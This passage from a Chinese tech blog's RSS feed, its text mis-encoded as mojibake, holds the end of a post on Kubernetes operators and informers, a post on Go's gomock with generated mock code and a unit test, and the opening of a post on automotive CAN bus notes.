<p>è¿™ä¹Ÿæ˜¯ä¸ºå•¥æˆ‘ä»¬åœ¨ç”¨kubectlæŸ¥çœ‹èµ„æºä¿¡æ¯çš„æ—¶å€™åå‡ºç°é¢å¤–çš„statuså­—æ®µï¼Œè¿™å®é™…ä¸Šæ˜¯æ‰§è¡Œè€…å¸®æˆ‘ä»¬è®°å½•çš„ï¼Œä¸“ä¸šç‚¹çš„å«æ³•æ˜¯<code>è§„çº¦(spec) - çŠ¶æ€(status)åˆ†ç¦»</code>ã€‚æ¯”å¦‚pod, é™¤äº†å…ƒä¿¡æ¯å¤–ï¼ŒçŠ¶æ€ä»specå’Œstatuså­—æ®µå¼€å§‹å±•å¼€ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-golang" data-lang="golang"><span class="kd">type</span> <span class="nx">Pod</span> <span class="kd">struct</span> <span class="p">{</span>
  <span class="nx">metav1</span><span class="p">.</span><span class="nx">TypeMeta</span> <span class="s">`json:&#34;,inline&#34;`</span>

  <span class="nx">metav1</span><span class="p">.</span><span class="nx">ObjectMeta</span> <span class="s">`json:&#34;metadata,omitempty&#34; protobuf:&#34;bytes,1,opt,name=metadata&#34;`</span>

  <span class="nx">Spec</span> <span class="nx">PodSpec</span> <span class="s">`json:&#34;spec,omitempty&#34; protobuf:&#34;bytes,2,opt,name=spec&#34;`</span>

  <span class="nx">Status</span> <span class="nx">PodStatus</span> <span class="s">`json:&#34;status,omitempty&#34; protobuf:&#34;bytes,3,opt,name=status&#34;`</span>
<span class="p">}</span>
</code></pre></div><h2 id="æ§åˆ¶å¾ªç¯control-loop">æ§åˆ¶å¾ªç¯ï¼ˆcontrol loopï¼‰</h2>
<p>èµ„æºçš„ç†æƒ³çŠ¶æ€å­˜å‚¨åœ¨k8sçš„apiserverä¸­ï¼Œä¸ºäº†è®©èµ„æºç”±å®é™…çŠ¶æ€å‘æœŸæœ›çŠ¶æ€é æ‹¢, æ‰§è¡Œè€…éœ€è¦ç›‘å¬èµ„æºæœŸæœ›çŠ¶æ€çš„å¢åˆ æ”¹äº‹ä»¶ï¼Œè¿™äº›äº‹ä»¶ä¼šè§¦å‘æ‰§è¡Œè€…ä»¥å®šæ—¶é‡å¤æ‰§è¡Œæ–¹å¼è°ƒç”¨å¯¹åº”çš„handlerå¤„ç†äº‹ä»¶, ç›´åˆ°æ»¡è¶³æœŸæœ›çŠ¶æ€ä¸ºæ­¢ï¼Œä¹‹åæ‰§è¡Œè€…å†æŠŠæ“ä½œç»“æœè®°å½•åˆ°å®é™…çŠ¶æ€ä¸­ã€‚</p>
<figure><img src="/img/%e8%81%8a%e8%81%8aoperator/controlloop2.png"
         alt="image" width="300px"/>
</figure>

<h2 id="æ‰§è¡Œè€…">æ‰§è¡Œè€…</h2>
<p>æˆ‘ä»¬çŸ¥é“ï¼Œkubeletæ˜¯k8sè‡ªå¸¦ç»„ä»¶ï¼Œä¸»è¦åŠŸèƒ½é€šè¿‡ç›‘å¬podæœŸæœ›çŠ¶æ€å˜åŒ–äº‹ä»¶å¹¶åšä¸€äº›äº‹ç¡®ä¿æœ¬åœ°çš„podå¤„äºæœŸæœ›çŠ¶æ€ã€‚</p>
<p>kube-proxyåŒæ ·ä¹Ÿä¼šå¤„ç†podçš„å¢åˆ æ”¹äº‹ä»¶ï¼Œå®ƒä¸æ–­åœ°åˆ·æ–°æœ¬æœºlinuxç½‘ç»œè®¾å¤‡çš„é…ç½®ï¼Œæ¥ç¡®ä¿podç½‘ç»œé€šç•…ã€‚</p>
<p>è¿˜æœ‰æˆ‘ä»¬å¸¸ç”¨çš„deploymentã€cronJobã€statefulsetç­‰ï¼Œå®ƒä»¬æ‹¥æœ‰è‡ªå·±çš„controlleråšæ§åˆ¶å¾ªç¯ï¼Œè¿™äº›controller è¿è¡Œåœ¨ç»„ä»¶controller-managerå†…ã€‚</p>
<p>ç„¶è€Œä¸åƒä¸Šé¢æåˆ°çš„å¤„ç†k8såŸç”Ÿèµ„æºçš„æ‰§è¡Œè€…ï¼Œè¿™æ¬¡æˆ‘ä»¬èŠçš„operator,ç”±crd(custom resource definition)ã€cr(custom resource)ã€controllerç»„æˆã€‚</p>
<p>crdç”¨æ¥æè¿°ä½ æƒ³åˆ›å»ºçš„èµ„æºåº”è¯¥æœ‰å“ªäº›å­—æ®µï¼Œcræ˜¯crdçš„å…·ä½“åŒ–å®ç°ï¼Œä¸å¯¹è±¡ï¼Œå¯¹è±¡å®ä¾‹ä¹‹é—´åŒºåˆ«ç±»ä¼¼ã€‚</p>
<p>æˆ‘ä»¬è‡ªå·±å®ç°çš„controlleræ§åˆ¶çš„ç›®æ ‡å°±æ˜¯cr, å®ƒçš„å®ç°åŸç†ç­‰åŒcontroller-managerä¸­çš„åŸç”Ÿcontrollerï¼š</p>
<ul>
<li>
<p>ä¾é informerçš„ListAndWatchæ–¹æ³•å°†æŒ‡å®šèµ„æºçš„çŠ¶æ€ç¼“å­˜åœ¨å†…å­˜ä¸­ï¼Œå¹¶ä¸æ–­ç›‘æ§çŠ¶æ€å˜åŒ–</p>
</li>
<li>
<p>reconcileæ–¹æ³•ä¸­çš„ä¸šåŠ¡é€»è¾‘ä¼šæ ¹æ®èµ„æºçš„æœŸæœ›çŠ¶æ€ï¼Œå¯¹å¤–éƒ¨ä¸–ç•Œä½œå‡ºæ”¹å˜ï¼Œå¦‚æœå¤„ç†å¤±è´¥ï¼Œå°±é‡æ–°å…¥é˜Ÿï¼ŒæŒ‰æŸç§è§„åˆ™åˆ°æŸä¸ªæ—¶é—´ç»§ç»­è¿›å…¥reconcile, ç›´åˆ°å¤„ç†å®Œæˆã€‚</p>
</li>
<li>
<p>ä¹Ÿå¯ä»¥è®¾ç½®resync period, å…¨é‡èµ„æºå®šæ—¶å…¥é˜Ÿå¤„ç†ã€‚</p>
<figure><img src="/img/%e8%81%8a%e8%81%8aoperator/controller.png"
         alt="image"/><figcaption>
            <p>figure-normal (without any classes)</p>
        </figcaption>
</figure>

</li>
</ul>
<h3 id="ä¸€äº›ç»†èŠ‚">ä¸€äº›ç»†èŠ‚</h3>
<h4 id="æ—¶é—´æ¢ç©ºé—´">æ—¶é—´æ¢ç©ºé—´</h4>
<p>api serveræ˜¯k8sçš„æ ¸å¿ƒç»„ä»¶ï¼Œæ€»ä¸èƒ½ä»…ä»…å› ä¸ºcontrollerè¦é¢‘ç¹è·å–èµ„æºçŠ¶æ€ï¼Œå°±è®©å®ƒå—é«˜qpså‹æ¦¨å»¶è¿Ÿå˜é«˜å§ï¼Œå› æ­¤controlleråœ¨è®¾è®¡æ—¶å°±é‡‡ç”¨çš„ç©ºé—´æ¢æ—¶é—´çš„ç­–ç•¥: æŠŠç›®æ ‡èµ„æºçŠ¶æ€å­˜åœ¨å†…å­˜é‡Œï¼Œinformerå†å’Œapi serverå»ºç«‹httpé•¿è¿æ¥watchäº‹ä»¶å˜åŒ–ï¼Œè¿™æ ·ä¸€æ¥ï¼Œcontrolleråœ¨è¯»å–èµ„æºçŠ¶æ€æ—¶ç›´æ¥ä»å†…å­˜è¯»å°±è¡Œäº†ï¼Œå˜æ›´èµ„æºçŠ¶æ€æ—¶å†é€šè¿‡clientå‘api serverå‘é€è¯·æ±‚ã€‚</p>
<p>cacheéƒ¨åˆ†ç”±informerå®ç°ï¼Œè¿™é‡Œå°æä»¥ä¸‹å®ƒçš„è®¾è®¡(å›¾åœ¨ä¸‹æ–¹)ï¼š</p>
<ul>
<li><code>Reflector</code>: list &amp; watch èµ„æºï¼Œå†™å…¥FIFO</li>
<li><code>FIFO queue</code>: å…¥é˜Ÿäº‹ä»¶åŠ¨ä½œå’Œå¯¹åº”èµ„æº,popå‡ºçš„æ•°æ®åŒæ—¶äº¤ç»™Indexerå’Œå¤–éƒ¨çš„eventHandler</li>
<li><code>Indexer(local store)</code>: åŸºäºå†…å­˜çš„å¹¶å‘å®‰å…¨å­˜å‚¨ï¼Œå­˜å‚¨FIFO popçš„æ•°æ®</li>
</ul>
<h4 id="è§£è€¦">è§£è€¦</h4>
<p>é€šå¸¸ï¼Œinformeræ¥æ”¶åˆ°äº‹ä»¶åä¸ä¼šç›´æ¥æ‰§è¡ŒeventHandlerä¸­çš„ä¸šåŠ¡é€»è¾‘ï¼Œè€Œæ˜¯å°†æ•°æ®ä¸¢è¿›queueä¸­ï¼Œç”±å¤šä¸ªå¹¶è¡Œçš„workerå¤„ç†ï¼Œå¦¥å¦¥çš„ç”Ÿäº§è€…-æ¶ˆè´¹è€…æ¨¡å‹ï¼Œé¿å…informeråœ¨è°ƒç”¨handleræ—¶é—´è¿‡é•¿è¢«æ‹–æ­»ã€‚</p>
<p><strong>é‚£ä¸åŠ work queueè§£è€¦ä¼šæœ‰ä»€ä¹ˆåæœï¼Ÿ</strong></p>
<p>é€šå¸¸æˆ‘ä»¬ç”¨çš„æ˜¯sharedInformerï¼Œè¿›ç¨‹é‡Œæœ‰å¤šä¸ªcontrolleræ—¶ï¼Œç”¨sharedInformerFactoryåˆ›å»ºå‡ºæ¥çš„Informeråªæœ‰ç‹¬ç«‹çš„listener, å…¶ä½™çš„reflectorå’Œindexeræ˜¯å…±äº«çš„ï¼ŒåŸå› å¾ˆç®€å•ï¼Œå¤šä¸ªé‡å¤reflectorä¼šå¢åŠ api serverè´Ÿæ‹…ã€‚è€Œä¸åŠ work queueæ—¶ï¼Œä¸Šä¸€ä¸ªaddHandlerè¿˜åœ¨å¤„ç†ä¸­ï¼Œlistenerå°±å°†ä¸‹ä¸€ä¸ªæ•°æ®å†™å…¥channel(listenerç”¨çš„æ— ç¼“å†²åŒºchannel)ï¼Œè€Œdistributeæ–¹æ³•åˆæ˜¯range listenersçš„ï¼Œç›´æ¥ä¼šå¯¼è‡´ä¹‹åçš„listeneræ— æ³•å†™å…¥æ•°æ®ï¼ŒFIFO queueæ— æ³•è¢«consume, åº•å±‚çš„sliceè¶Šæ¥è¶Šå¤§ï¼Œç›´åˆ°OOMã€‚</p>
<figure><img src="/img/%e8%81%8a%e8%81%8aoperator/informer2.png"
         alt="image" width="600px"/>
</figure>

<h2 id="æ¡†æ¶ç”Ÿæˆå·¥å…·">æ¡†æ¶ç”Ÿæˆå·¥å…·</h2>
<ul>
<li>code-generator: åº•å±‚æ–¹å¼ï¼ŒåŸºæœ¬æ²¡å°è£…ï¼Œèƒ½å¸®ä½ äº†è§£operatorçš„åŸå§‹è®¾è®¡ã€‚</li>
<li>kube-builder: å°è£…å¥½ï¼ŒåŸºæœ¬åªè¦å…³æ³¨reconcileçš„ä¸šåŠ¡é€»è¾‘å®ç°ã€‚</li>
<li>operator-sdk: åŸºäºcontroller-runtime, å’Œkube-builderå¤§åŒå°å¼‚, æœªæ¥å¯èƒ½åˆå¹¶ã€‚</li>
</ul>
<h2 id="æµ‹è¯•å·¥å…·">æµ‹è¯•å·¥å…·</h2>
<p>kubebuilder-generatored operator æœ‰è‡ªå·±å†…åµŒçš„æµ‹è¯•æ¡†æ¶ginkgo&amp;gomegaï¼Œè¿™å¥—æ¡†æ¶ä¼šä¾èµ–æœ¬åœ°çš„api-serveræˆ–è€…ä¾èµ–æœ¬åœ°etcdäºŒè¿›åˆ¶æ–‡ä»¶å†åˆ›å»ºå‡ºæ¥ä¸€ä¸ªæ–°çš„api serverï¼Œç”¨ä½œcontroller-runtime clientçš„è¯·æ±‚ç›®æ ‡ï¼Œæµ‹è¯•è¿‡ç¨‹æŒ‰ç€è¡Œä¸ºé©±åŠ¨å¼€å‘ï¼ˆBDDï¼‰çš„æ–¹å¼èµ°ï¼Œå†™èµ·æ¥å¾ˆçœå¿ƒã€‚</p>
<h2 id="ç»ƒä¹ ">ç»ƒä¹ </h2>
<p>å®åœ¨å¤ªæ‡’ï¼Œæˆ‘æŠŠdemoåœ°å€æ”¾ä¸‹é¢äº†ï¼Œä¸šåŠ¡é€»è¾‘åŸºæœ¬æ˜¯æŠ„ä¹¦æŠ„çš„ï¼Œå¸¦æ³¨é‡Šå¸¦å•å…ƒæµ‹è¯•ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥å»çœ‹çœ‹ã€‚</p>
<ul>
<li><a href="https://github.com/TonyShanc/sample-operator-v1">code-generator generated operator demo</a></li>
<li><a href="https://github.com/TonyShanc/sample-operator-v2">kubebuilder generated operator demo</a></li>
</ul>
<h2 id="å‚è€ƒ">å‚è€ƒ</h2>
<ul>
<li>ã€Šprogramming kubernetesã€‹</li>
<li>ã€Škubernetesæºç å‰–æã€‹</li>
<li>ã€Šæ·±å…¥å‰–ækubernetesã€‹</li>
</ul>
]]></content>
		</item>
		
		<item>
			<title>go-mockåˆæ¢</title>
			<link>https://shankisme.com/posts/go-mock%E5%88%9D%E6%8E%A2/</link>
			<pubDate>Fri, 22 Jan 2021 01:41:04 +0800</pubDate>
			
			<guid>https://shankisme.com/posts/go-mock%E5%88%9D%E6%8E%A2/</guid>
			<description>go mock ç”¨äºè™šæ‹Ÿæ¥å£ã€‚ä¸€èˆ¬åªè¦æä¾›interfaceï¼Œæ— è®ºæœ‰æ²¡æœ‰å®ç°è¯¥interfaceçš„ç±»å‹ï¼Œgomockä¼šæ ¹æ®æ¥å£çš„è¾“å…¥è¾“å‡ºæä¾›ä¸€ä¸ªå®ç°äº†è¯¥interfaceçš„mockå®ä¾‹ï¼ŒåŒæ—¶åœ¨è‡ªå®šä¹‰mockå®ä¾‹çš„è¾“å…¥è¾“å‡ºå‰ï¼Œå¯ä»¥æ ¹æ®æœŸæœ›è¿‡æ»¤è¾“å…¥ï¼Œäº§ç”Ÿæƒ³è¦çš„è¾“å‡ºæˆ–è°ƒç”¨æŸäº›å‡½æ•°ã€‚è¯´çš„å¾ˆæ™¦æ¶©ï¼Œçœ‹ç‚¹ä»£ç å§ã€‚
ç›®å½•ç»“æ„ï¼š
trymock/ /db |--db.go |--db_test.go /mock |--db_mock.go // generated by mockgen //db.go type DB interface { Get(key string) (int, error) } func GetFromDB(db DB, key string) int { if value, err := db.Get(key); err == nil { return value } return -1 } gomockä¸­ï¼ŒDBå®ä¾‹åªèƒ½é€šè¿‡ä¼ å‚ä¼ å…¥ç”Ÿæˆmockæ–‡ä»¶
mockgen -source=db.go -destination=db_mock.go -package=mock gomockç”Ÿæˆçš„db_mock.goå¦‚ä¸‹
//db_mock.go // Code generated by MockGen. DO NOT EDIT. // Source: db.go  // Package mock_db is a generated GoMock package.</description>
			<content type="html"><![CDATA[<p>go mock ç”¨äºè™šæ‹Ÿæ¥å£ã€‚ä¸€èˆ¬åªè¦æä¾›interfaceï¼Œæ— è®ºæœ‰æ²¡æœ‰å®ç°è¯¥interfaceçš„ç±»å‹ï¼Œgomockä¼šæ ¹æ®æ¥å£çš„è¾“å…¥è¾“å‡ºæä¾›ä¸€ä¸ªå®ç°äº†è¯¥interfaceçš„mockå®ä¾‹ï¼ŒåŒæ—¶åœ¨è‡ªå®šä¹‰mockå®ä¾‹çš„è¾“å…¥è¾“å‡ºå‰ï¼Œå¯ä»¥æ ¹æ®æœŸæœ›è¿‡æ»¤è¾“å…¥ï¼Œäº§ç”Ÿæƒ³è¦çš„è¾“å‡ºæˆ–è°ƒç”¨æŸäº›å‡½æ•°ã€‚è¯´çš„å¾ˆæ™¦æ¶©ï¼Œçœ‹ç‚¹ä»£ç å§ã€‚</p>
<p>ç›®å½•ç»“æ„ï¼š</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">trymock/
    /db
    <span class="p">|</span>--db.go
    <span class="p">|</span>--db_test.go
    /mock
      <span class="p">|</span>--db_mock.go // generated by mockgen
</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="c1">//db.go
</span><span class="c1"></span><span class="kd">type</span> <span class="nx">DB</span> <span class="kd">interface</span> <span class="p">{</span>
    <span class="nf">Get</span><span class="p">(</span><span class="nx">key</span> <span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">GetFromDB</span><span class="p">(</span><span class="nx">db</span> <span class="nx">DB</span><span class="p">,</span> <span class="nx">key</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">int</span> <span class="p">{</span>
    <span class="k">if</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">db</span><span class="p">.</span><span class="nf">Get</span><span class="p">(</span><span class="nx">key</span><span class="p">);</span> <span class="nx">err</span> <span class="o">==</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">value</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span>
<span class="p">}</span>
</code></pre></div><p>gomockä¸­ï¼ŒDBå®ä¾‹åªèƒ½é€šè¿‡ä¼ å‚ä¼ å…¥ç”Ÿæˆmockæ–‡ä»¶</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">mockgen -source<span class="o">=</span>db.go -destination<span class="o">=</span>db_mock.go -package<span class="o">=</span>mock
</code></pre></div><p>gomockç”Ÿæˆçš„db_mock.goå¦‚ä¸‹</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="c1">//db_mock.go
</span><span class="c1">// Code generated by MockGen. DO NOT EDIT.
</span><span class="c1">// Source: db.go
</span><span class="c1"></span>
<span class="c1">// Package mock_db is a generated GoMock package.
</span><span class="c1"></span><span class="kn">package</span> <span class="nx">mock</span>

<span class="kn">import</span> <span class="p">(</span>
    <span class="nx">gomock</span> <span class="s">&#34;github.com/golang/mock/gomock&#34;</span>
    <span class="nx">reflect</span> <span class="s">&#34;reflect&#34;</span>
<span class="p">)</span>

<span class="c1">// MockDB is a mock of DB interface
</span><span class="c1"></span><span class="kd">type</span> <span class="nx">MockDB</span> <span class="kd">struct</span> <span class="p">{</span>
    <span class="nx">ctrl</span>     <span class="o">*</span><span class="nx">gomock</span><span class="p">.</span><span class="nx">Controller</span>
    <span class="nx">recorder</span> <span class="o">*</span><span class="nx">MockDBMockRecorder</span>
<span class="p">}</span>

<span class="c1">// MockDBMockRecorder is the mock recorder for MockDB
</span><span class="c1"></span><span class="kd">type</span> <span class="nx">MockDBMockRecorder</span> <span class="kd">struct</span> <span class="p">{</span>
    <span class="nx">mock</span> <span class="o">*</span><span class="nx">MockDB</span>
<span class="p">}</span>

<span class="c1">// NewMockDB creates a new mock instance
</span><span class="c1"></span><span class="kd">func</span> <span class="nf">NewMockDB</span><span class="p">(</span><span class="nx">ctrl</span> <span class="o">*</span><span class="nx">gomock</span><span class="p">.</span><span class="nx">Controller</span><span class="p">)</span> <span class="o">*</span><span class="nx">MockDB</span> <span class="p">{</span>
    <span class="nx">mock</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">MockDB</span><span class="p">{</span><span class="nx">ctrl</span><span class="p">:</span> <span class="nx">ctrl</span><span class="p">}</span>
    <span class="nx">mock</span><span class="p">.</span><span class="nx">recorder</span> <span class="p">=</span> <span class="o">&amp;</span><span class="nx">MockDBMockRecorder</span><span class="p">{</span><span class="nx">mock</span><span class="p">}</span>
    <span class="k">return</span> <span class="nx">mock</span>
<span class="p">}</span>

<span class="c1">// EXPECT returns an object that allows the caller to indicate expected use
</span><span class="c1"></span><span class="kd">func</span> <span class="p">(</span><span class="nx">m</span> <span class="o">*</span><span class="nx">MockDB</span><span class="p">)</span> <span class="nf">EXPECT</span><span class="p">()</span> <span class="o">*</span><span class="nx">MockDBMockRecorder</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">m</span><span class="p">.</span><span class="nx">recorder</span>
<span class="p">}</span>

<span class="c1">// Get mocks base method
</span><span class="c1"></span><span class="kd">func</span> <span class="p">(</span><span class="nx">m</span> <span class="o">*</span><span class="nx">MockDB</span><span class="p">)</span> <span class="nf">Get</span><span class="p">(</span><span class="nx">key</span> <span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">m</span><span class="p">.</span><span class="nx">ctrl</span><span class="p">.</span><span class="nx">T</span><span class="p">.</span><span class="nf">Helper</span><span class="p">()</span>
    <span class="nx">ret</span> <span class="o">:=</span> <span class="nx">m</span><span class="p">.</span><span class="nx">ctrl</span><span class="p">.</span><span class="nf">Call</span><span class="p">(</span><span class="nx">m</span><span class="p">,</span> <span class="s">&#34;Get&#34;</span><span class="p">,</span> <span class="nx">key</span><span class="p">)</span>
    <span class="nx">ret0</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">ret</span><span class="p">[</span><span class="mi">0</span><span class="p">].(</span><span class="kt">int</span><span class="p">)</span>
    <span class="nx">ret1</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">ret</span><span class="p">[</span><span class="mi">1</span><span class="p">].(</span><span class="kt">error</span><span class="p">)</span>
    <span class="k">return</span> <span class="nx">ret0</span><span class="p">,</span> <span class="nx">ret1</span>
<span class="p">}</span>

<span class="c1">// Get indicates an expected call of Get
</span><span class="c1"></span><span class="kd">func</span> <span class="p">(</span><span class="nx">mr</span> <span class="o">*</span><span class="nx">MockDBMockRecorder</span><span class="p">)</span> <span class="nf">Get</span><span class="p">(</span><span class="nx">key</span> <span class="kd">interface</span><span class="p">{})</span> <span class="o">*</span><span class="nx">gomock</span><span class="p">.</span><span class="nx">Call</span> <span class="p">{</span>
    <span class="nx">mr</span><span class="p">.</span><span class="nx">mock</span><span class="p">.</span><span class="nx">ctrl</span><span class="p">.</span><span class="nx">T</span><span class="p">.</span><span class="nf">Helper</span><span class="p">()</span>
    <span class="k">return</span> <span class="nx">mr</span><span class="p">.</span><span class="nx">mock</span><span class="p">.</span><span class="nx">ctrl</span><span class="p">.</span><span class="nf">RecordCallWithMethodType</span><span class="p">(</span><span class="nx">mr</span><span class="p">.</span><span class="nx">mock</span><span class="p">,</span> <span class="s">&#34;Get&#34;</span><span class="p">,</span> <span class="nx">reflect</span><span class="p">.</span><span class="nf">TypeOf</span><span class="p">((</span><span class="o">*</span><span class="nx">MockDB</span><span class="p">)(</span><span class="kc">nil</span><span class="p">).</span><span class="nx">Get</span><span class="p">),</span> <span class="nx">key</span><span class="p">)</span>
<span class="p">}</span>

</code></pre></div><p>æµ‹è¯•</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="c1">// db_test.go
</span><span class="c1"></span><span class="kd">func</span> <span class="nf">TestGetFromDB</span><span class="p">(</span><span class="nx">t</span> <span class="o">*</span><span class="nx">testing</span><span class="p">.</span><span class="nx">T</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">ctrl</span> <span class="o">:=</span> <span class="nx">gomock</span><span class="p">.</span><span class="nf">NewController</span><span class="p">(</span><span class="nx">t</span><span class="p">)</span>
    <span class="k">defer</span> <span class="nx">ctrl</span><span class="p">.</span><span class="nf">Finish</span><span class="p">()</span> <span class="c1">// æ–­è¨€ DB.Get() æ–¹æ³•æ˜¯å¦è¢«è°ƒç”¨
</span><span class="c1"></span>
    <span class="nx">m</span> <span class="o">:=</span> <span class="nx">mock</span><span class="p">.</span><span class="nf">NewMockDB</span><span class="p">(</span><span class="nx">ctrl</span><span class="p">)</span>
    <span class="nx">m</span><span class="p">.</span><span class="nf">EXPECT</span><span class="p">().</span><span class="nf">Get</span><span class="p">(</span><span class="nx">gomock</span><span class="p">.</span><span class="nf">Eq</span><span class="p">(</span><span class="s">&#34;Tom&#34;</span><span class="p">)).</span><span class="nf">Return</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="nx">errors</span><span class="p">.</span><span class="nf">New</span><span class="p">(</span><span class="s">&#34;not exist&#34;</span><span class="p">))</span>

    <span class="k">if</span> <span class="nx">v</span> <span class="o">:=</span> <span class="nf">GetFromDB</span><span class="p">(</span><span class="nx">m</span><span class="p">,</span> <span class="s">&#34;Tom&#34;</span><span class="p">);</span> <span class="nx">v</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">{</span>
        <span class="nx">t</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="s">&#34;expected -1, but got&#34;</span><span class="p">,</span> <span class="nx">v</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>

</code></pre></div><p>go mockæœ‰ä¸ªé™åˆ¶ï¼Œç”Ÿæˆçš„mock_dbå®ä¾‹å’ŒçœŸæ­£çš„dbå®ä¾‹æ˜¯ä¸¤ä¸ªä¸ä¸€æ ·çš„å®ä¾‹ï¼ˆåºŸè¯ï¼‰ï¼Œå› æ­¤åœ¨å†™æµ‹è¯•æ—¶éœ€è¦ä½¿ç”¨mockå®ä¾‹ï¼Œè€Œå¼€å‘/ç”Ÿäº§ç¯å¢ƒä¸­éœ€è¦ç”¨çœŸæ­£çš„dbå®ä¾‹ï¼Œå¯¼è‡´åœ¨è®¾è®¡GetFromDBä¸€ç±»çš„æ–¹æ³•æ—¶ï¼Œéœ€è¦å°†dbå®ä¾‹ä½œä¸ºå‚æ•°ä¼ å…¥æ–¹æ³•ä¸­ï¼Œè¿™æ ·æœ‰ç¢ç»“æ„è®¾è®¡çš„çµæ´»æ€§ã€‚ å½“ç„¶æœ‰æ–¹æ³•èƒ½è¶Šè¿‡è¿™å±‚é˜»ç¢é‡ç‚¹</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="c1">//db.go
</span><span class="c1"></span>
<span class="kd">func</span> <span class="nf">GetFromDB</span><span class="p">(</span><span class="nx">key</span> <span class="kt">string</span><span class="p">){</span>
    <span class="nx">db</span> <span class="o">:=</span> <span class="nx">db</span><span class="p">.</span><span class="nf">getDBClient</span><span class="p">()</span>
    <span class="nx">db</span><span class="p">.</span><span class="nf">Get</span><span class="p">(</span><span class="nx">key</span><span class="p">)</span>
    <span class="o">...</span>
<span class="p">}</span>
<span class="kd">var</span>  <span class="nx">mockDBClient</span> <span class="nx">DB</span>

<span class="kd">func</span> <span class="nf">getDBClient</span><span class="p">(){</span>
  <span class="k">if</span> <span class="nx">mockDBClient</span> <span class="o">!=</span> <span class="kc">nil</span><span class="p">{</span>
    <span class="k">return</span> <span class="nx">mockDBClient</span>
  <span class="p">}</span>
  <span class="c1">// æ‡’åŠ è½½è·å¾—çœŸå®çš„DBè¿æ¥å¹¶è¿”å›
</span><span class="c1"></span>  <span class="k">return</span> <span class="nx">actual</span><span class="p">.</span><span class="nf">GetDBClient</span><span class="p">()</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">newMockDBClient</span><span class="p">(</span><span class="nx">t</span> <span class="o">*</span><span class="nx">testing</span><span class="p">.</span><span class="nx">T</span><span class="p">){</span>
  <span class="nx">gomock</span><span class="p">.</span><span class="nf">NewController</span><span class="p">(</span><span class="nx">t</span><span class="p">)</span>
  <span class="nx">m</span> <span class="o">:=</span> <span class="nx">mock</span><span class="p">.</span><span class="nf">NewMockDB</span><span class="p">(</span><span class="nx">ctrl</span><span class="p">)</span>
  <span class="nx">mockDBClient</span> <span class="p">=</span> <span class="nx">m</span>
<span class="p">}</span>
</code></pre></div><p>ä»¥ä¸Šå°†è·å–çœŸå®DBClientä¹‹å‰åŠ ä¸Šäº†ä¸€å±‚åˆ¤æ–­ï¼Œåˆ¤æ–­æ˜¯å¦åˆ›å»ºäº†mockDBï¼Œåˆ›å»ºäº†åˆ™è¿”å›mockDB, æ²¡åˆ›å»ºå°±æ‡’åŠ è½½DBè¿æ¥ã€‚ gomockå¦ä¸€ä¸ªç¼ºé™·æ˜¯ä»–ä¸æ”¯æŒè‡ªåŠ¨ç”Ÿæˆå“åº”ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸èƒ½é…ç½®mock serverï¼Œæˆ–è®¸gomockæ˜¯ä¸“ä¸ºæµ‹è¯•è®¾è®¡çš„ï¼Œserverè¿™ä¸€å—ç”¨äºå‰ç«¯è°ƒç”¨æ¨¡æ‹Ÿï¼Œä¸€èˆ¬ä¹Ÿæ˜¯ç»™ä¸ªæ¥å£å°±èƒ½åˆ›å»ºï¼Œåº”è¯¥æœ‰å…¶ä»–æŠ€æœ¯è¦†ç›–äº†è¿™ä¸€å—ã€‚</p>
]]></content>
		</item>
		
		<item>
			<title>æ±½è½¦CANæ€»çº¿å¤ä¹ ç¬”è®°</title>
			<link>https://shankisme.com/posts/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6%E6%B1%BD%E8%BD%A6can%E6%80%BB%E7%BA%BF%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/</link>
			<pubDate>Sat, 16 Jan 2021 20:45:02 +0800</pubDate>
			
			<guid>https://shankisme.com/posts/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6%E6%B1%BD%E8%BD%A6can%E6%80%BB%E7%BA%BF%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid>
			<description>CANæ€»çº¿ä½¿ç”¨æ€»çº¿æŠ€æœ¯ï¼Œå–ä»£äº†ä¼ ç»Ÿçš„ç‚¹å¯¹ç‚¹å¸ƒçº¿æ–¹å¼è¿æ¥æ±½è½¦ç”µå­æ§åˆ¶å•å…ƒï¼ˆECUï¼‰, è§£å†³äº†ä¼ ç»Ÿå¸ƒçº¿æ–¹å¼ä¸­çº¿æŸå¤šï¼Œå¸ƒçº¿éš¾ï¼Œæˆæœ¬é«˜ç­‰é—®é¢˜ã€‚
 figure-normal (without any classes)
